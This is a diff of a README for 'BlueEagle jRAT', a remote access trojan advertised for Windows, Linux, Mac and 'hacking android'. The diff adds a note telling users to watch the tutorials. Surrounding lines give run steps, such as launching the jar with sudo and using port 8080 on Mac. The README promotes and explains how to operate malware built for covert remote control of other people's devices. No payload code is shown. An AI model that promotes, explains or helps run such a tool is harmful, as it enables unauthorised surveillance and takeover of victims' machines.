@@ -2,6 +2,8 @@
 💿 BlueEagle jRAT V1.0 [Windows RAT / Linux RAT / MAC RAT] 
 [Windows RAT] [Linux RAT] [MAC RAT] 
 # 💿  Ver 1.5 Updated for hacking android , the apk Builder is standlone in zip file provided
+# ▶️ NOTE ▶️
+▶️ Watch the tutorials till the end , because of any question submitted about a point was explained in tutorial , will not be answered 
 
 # 💿  Ver 1.4 Updated for working on MAC issues , For working on MAC : , choose port 8080 , else will exit due to MAC restrictions for ports usage (OS issue)
 # 💿 For working on Linux : open terminal , then change dir to folder release , then "sudo java -jar SBEjRAT.jar" 
